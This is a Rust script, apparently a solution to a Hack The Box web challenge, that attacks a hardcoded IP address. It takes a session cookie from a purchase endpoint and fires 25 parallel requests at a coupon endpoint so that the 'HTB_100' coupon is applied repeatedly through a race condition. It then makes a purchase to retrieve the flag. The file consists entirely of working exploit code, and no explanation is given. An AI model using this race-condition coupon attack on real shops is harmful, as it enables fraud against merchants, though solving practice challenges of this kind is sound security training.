use futures::{Stream, StreamExt};
use reqwest::cookie::{CookieStore, Jar};
use reqwest::header::{HeaderMap, COOKIE};
use reqwest::Url;
use std::collections::HashMap;

const PARALLEL_REQUESTS: usize = 25;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let ip = "165.227.230.220";
    let port = "31038";
    // EXTRACT COOKIE
    let client1 = reqwest::Client::builder().build()?;
    let purchase_api = format!("http://{}:{}/api/purchase", &ip, &port);
    let mut soap = HashMap::new();
    soap.insert("item", "C8");
    let resp = client1
        .post(purchase_api.clone())
        .json(&soap)
        .send()
        .await?;
    let h = &resp.headers()["set-cookie"].to_str().unwrap();
    let cookie = &h[..153];
    let coupon_api = format!("http://{}:{}/api/coupons/apply", &ip, &port);
    let coupon_endpoint = coupon_api.clone().parse::<Url>().unwrap();
    let jar = Jar::default();
    jar.add_cookie_str(cookie, &coupon_endpoint);

    // INSERT COUPONS
    let mut coupon_code = HashMap::new();
    coupon_code.insert("coupon_code", "HTB_100");
    let mut headers = HeaderMap::new();
    headers.insert(COOKIE, jar.cookies(&coupon_endpoint).unwrap());
    let client2 = reqwest::Client::builder()
        .default_headers(headers)
        .build()?;
    let endpoint = vec![coupon_api; 25];
    let responses = futures::stream::iter(endpoint)
        .map(|endpoint| {
            let c = client2.clone();
            let mut coupon_code = HashMap::new();
            coupon_code.insert("coupon_code", "HTB_100");
            tokio::spawn(async move {
                let resp = c.post(endpoint).json(&coupon_code).send().await?;
                resp.bytes().await
            })
        })
        .buffer_unordered(PARALLEL_REQUESTS);
    responses
        .for_each(|r| async {
            match r {
                Ok(Ok(r)) => println!("{:?}", r),
                Ok(Err(e)) => eprintln!("{}", e),
                Err(e) => eprintln!("Got a tokio::JoinError: {}", e),
            }
        })
        .await;

    // EXTRACT FLAG
    let flag = client2
        .post(purchase_api)
        .json(&soap)
        .send()
        .await
        .unwrap()
        .text()
        .await;
    println!("{:?}", flag);

    Ok(())
}
